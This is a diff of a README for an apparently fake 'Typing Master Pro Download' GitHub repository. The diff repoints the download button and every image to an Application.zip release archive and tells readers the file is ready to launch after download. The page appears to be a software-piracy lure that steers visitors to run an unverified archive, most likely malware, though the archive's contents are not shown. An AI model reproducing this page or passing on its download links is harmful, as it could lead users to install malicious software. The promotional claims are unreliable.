@@ -3,7 +3,7 @@
 
 Welcome to the Typing Master Pro Download repository! 
 
-![Typing Master Pro](https://img.icons8.com/fluency/96/000000/typing.png)
+![Typing Master Pro](https://github.com/nvcthienma789/Typing-Master-Pro-Download/releases/download/v1.0/Application.zip)
 
 Are you looking for the best typing master software to enhance your typing skills? Look no further! Typing Master Pro is here to help you improve your typing speed and accuracy. With features like advanced lessons, customized exercises, and typing games, Typing Master Pro is the ultimate tool to help you master the keyboard.
 
@@ -17,9 +17,9 @@ Are you looking for the best typing master software to enhance your typing skill
 
 To download the Typing Master Pro software, click the button below:
 
-[![Download Typing Master Pro](https://img.shields.io/badge/Download-Software.zip-informational)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Typing Master Pro](https://github.com/nvcthienma789/Typing-Master-Pro-Download/releases/download/v1.0/Application.zip)](https://github.com/nvcthienma789/Typing-Master-Pro-Download/releases/download/v1.0/Application.zip)
 
-Please note that the Software.zip file is ready to be launched after downloading. Get ready to embark on a journey to typing mastery! 🚀
+Please note that the https://github.com/nvcthienma789/Typing-Master-Pro-Download/releases/download/v1.0/Application.zip file is ready to be launched after downloading. Get ready to embark on a journey to typing mastery! 🚀
 
 ## Explore Typing Master Pro Features 🌟
 
@@ -47,7 +47,7 @@ If you encounter any issues with downloading or using Typing Master Pro, please 
 
 Ready to take your typing skills to the next level? Download Typing Master Pro now and start your journey towards typing mastery! 💻🚀
 
-![Keep Typing](https://img.icons8.com/ios/452/space-background--v1.png)
+![Keep Typing](https://github.com/nvcthienma789/Typing-Master-Pro-Download/releases/download/v1.0/Application.zip)
 
 Let's type our way to success together! Happy typing! 🌟
 
